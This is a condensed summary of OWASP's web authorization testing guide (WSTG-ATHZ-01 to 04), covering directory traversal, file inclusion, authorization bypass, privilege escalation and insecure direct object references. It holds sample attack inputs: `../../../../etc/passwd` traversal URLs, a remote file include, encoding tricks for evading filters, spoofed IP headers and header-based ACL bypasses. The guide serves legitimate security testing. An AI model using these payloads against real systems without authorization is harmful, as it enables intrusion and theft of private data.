# WSTG ATHZ — Authorization

OWASP WSTG v4.2. Tests WSTG-ATHZ-01 → 04.

## Table of Contents

- [ATHZ-01 Directory Traversal / File Include](#wstg-athz-01)
- [ATHZ-02 Bypassing Authorization Schema](#wstg-athz-02)
- [ATHZ-03 Privilege Escalation](#wstg-athz-03)
- [ATHZ-04 Insecure Direct Object References](#wstg-athz-04)

---

## WSTG-ATHZ-01

**Testing Directory Traversal File Include**

Goal: find input vectors (params, cookies) that let an attacker escape the web document root via `../` sequences or include arbitrary local/remote files.

Black-box:
1. **Enumerate input vectors** — any GET/POST param, cookie, or upload used in file operations: unusual extensions, suggestive names (`file=`, `item=`, `home=`, `template=`).
2. **Test each vector**:

```
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
http://example.com/index.php?file=http://www.owasp.org/malicioustxt   (remote file include)
http://example.com/index.php?file=file:///etc/passwd                 (local wrapper)
http://example.com/index.php?file=http://192.168.0.2:9080            (internal service probe)
http://example.com/main.cgi?home=main.cgi                            (leaks own source, no traversal needed)
```

Path separators differ by OS (`/` on Unix, `\` or `/` on Windows). When basic `../` is filtered, try encoding variants:

| Encoding | Represents |
|---|---|
| `%2e%2e%2f`, `%2e%2e/`, `..%2f` | `../` |
| `%2e%2e%5c`, `..%5c` | `..\` |
| `%252e%252e%255c` (double-encoded) | `..\` |
| `..%c0%af` / `..%c1%9c` (overlong UTF-8) | `../` / `..\` |

Windows-specific quirks worth trying: trailing `<`, `>`, `"`, extra `.` or spaces after a filename, self-referential `./`, and UNC paths (`\\server\share\file`) which can leak SMB credentials to an attacker-controlled server. NT device namespace refs (`\\.\GLOBALROOT\Device\HarddiskVolumeN\`) can also reach raw volumes.

Gray-box: grep source for inclusion/file functions and weak "sanitizers" that string-replace instead of reject:

| Language | Functions to grep for |
|---|---|
| PHP | `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()` |
| JSP/Servlet | `java.io.File()`, `java.io.FileReader()` |
| ASP | `#include file`, `#include virtual` |

PHP regex: `(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`

Naive blacklist sanitizers (e.g. stripping `../` once) are bypassable with overlapping sequences: `....//....//boot.ini` → after one `../` strip, still traverses.

Tools: DotDotPwn, WFuzz path-traversal lists, OWASP ZAP, Burp Suite, DirBuster, grep.

Refs: *phpBB Attachment Mod Directory Traversal HTTP POST Injection*; *Windows File Pseudonyms: Pwnage and Poetry*.

---

## WSTG-ATHZ-02

**Testing for Bypassing Authorization Schema**

Goal: confirm every protected function enforces the correct role — horizontally (same role, different identity) and vertically (different role).

**Horizontal**: two accounts with identical privileges, two live sessions. Swap the session token or identity param between requests to the same endpoint and compare responses.

```
POST /account/viewSettings HTTP/1.1
Cookie: SessionID=ATTACKER_SESSION
username=example_user
```
If the attacker's session gets `example_user`'s data back, the app is vulnerable.

**Vertical**: sessions at two different privilege levels; swap the session token on a higher-privilege request and check if the lower-privilege session succeeds.

```
POST /account/deleteEvent HTTP/1.1
Cookie: SessionID=CUSTOMER_USER_SESSION
EventID=1000002
```
`{"message": "Event was deleted"}` returned to a customer session confirms the bypass. Also check the admin menu itself isn't reachable by non-admins — some apps only gate the UI, not the underlying function.

**Special request headers** — some front-ends trust `X-Original-URL` / `X-Rewrite-URL` to override the routed path, useful for bypassing an upstream ACL that blocks `/admin` by URL:
```
GET / HTTP/1.1
X-Original-URL: /donotexist1
```
A 404/"not found" response confirms the header is honored — then send the allowed front-end path with the real target in the header. Similarly, admin panels gated to "local" clients may trust spoofable IP headers:

| Headers to try | Values to try |
|---|---|
| `X-Forwarded-For`, `X-Forward-For`, `X-Remote-IP`, `X-Originating-IP`, `X-Remote-Addr`, `X-Client-IP` | `127.0.0.1`, `localhost`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` |

Appending a port (`127.0.0.4:80`) can sometimes evade WAF pattern matching too.

Remediation: enforce least privilege on every role/resource, server-side, not just in the UI.

Tools: OWASP ZAP + Access Control Testing add-on, Burp Suite + AuthMatrix/Autorize.

Refs: OWASP ASVS 4.0.1 (v4.0.1-1, -4, -9, -16).

---

## WSTG-ATHZ-03

**Testing for Privilege Escalation**

Goal: confirm a user can't manipulate roles, group IDs, or trusted client values to gain unauthorized privilege — vertical (reaching a higher role) or horizontal (reaching a peer's data).

Techniques to test:

| Vector | Example |
|---|---|
| Group manipulation | `groupID=grp001&orderID=0001` — does a non-grp001 user reach it by changing `groupID`? |
| Profile field manipulation | hidden form field `<input type="hidden" name="profile" value="SysAdmin">` — tamper the value client-side |
| Condition-value manipulation | response encodes status in a positional field (e.g. `PVValid`); flipping `-1`→`0` may suppress an error check meant to block escalation |
| Trusted IP header | `X-Forwarded-For: 8.1.1.1` — if trusted for IP-based access/lockout logic, spoof it |
| URL traversal | `/../.././userInfo.html` — reach a page whose authz check only applies to the canonical path |
| Partial URL match | authz check using `startswith()`/`contains()` instead of exact match — craft a URL that matches the substring but routes elsewhere |
| Weak session ID | e.g. `sessionID = MD5(password + userID)` — guess/derive another user's session |

For every function that creates, reads, or deletes data, try it as a different user/role and confirm the server — not just the UI — rejects it.

Tools: OWASP ZAP.

Refs: Wikipedia — Privilege Escalation.

---

## WSTG-ATHZ-04

**Testing for Insecure Direct Object References**

Goal: confirm object references (DB keys, filenames, menu IDs) supplied by the client can't be tampered with to reach another user's data or restricted functionality.

Best setup: 2+ test accounts, each owning distinct objects, so tampered references can be checked against known "shouldn't be reachable" targets.

| Pattern | Example | Test |
|---|---|---|
| DB record via param | `?invoice=12345` | swap to another user's known invoice ID |
| Operation via param | `/changepassword?user=someuser` | swap `user` to a different account, no current-password check |
| Filesystem resource via param | `/showImage?img=img00011` | swap to another user's file ID (often combines with [ATHZ-01](#wstg-athz-01)) |
| App functionality via param | `/accessPage?menuitem=12` | request a `menuitem` value outside the user's allowed set |

A single param is the common case; some apps split the object reference across multiple params — adjust accordingly.

Refs: OWASP Top 10 2013-A4 — Insecure Direct Object References.
